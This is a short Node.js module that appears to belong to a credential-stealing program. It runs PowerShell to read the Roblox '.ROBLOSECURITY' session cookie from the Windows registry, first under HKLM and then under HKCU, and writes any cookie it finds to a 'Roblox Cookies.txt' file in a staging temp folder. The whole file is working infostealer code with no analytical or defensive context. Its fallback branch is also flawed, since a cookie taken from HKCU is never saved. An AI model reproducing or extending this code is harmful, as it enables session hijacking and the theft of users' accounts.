const { join } = require('path');
const fs = require('fs');
const { spawnSync } = require('child_process');
const { tempFolder } = require('../index');

const subprocess = (path) => {
  return spawnSync('powershell', [`Get-ItemPropertyValue -Path ${path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY`]).stdout.toString();
};

let regCookie = subprocess('HKLM');
const cookies = [];
!regCookie ? regCookie = subprocess('HKCU') : cookies.push(regCookie);
if (cookies.length !== 0) {
  fs.writeFileSync(join(tempFolder, 'Roblox Cookies.txt'), cookies.join('\n'));
}
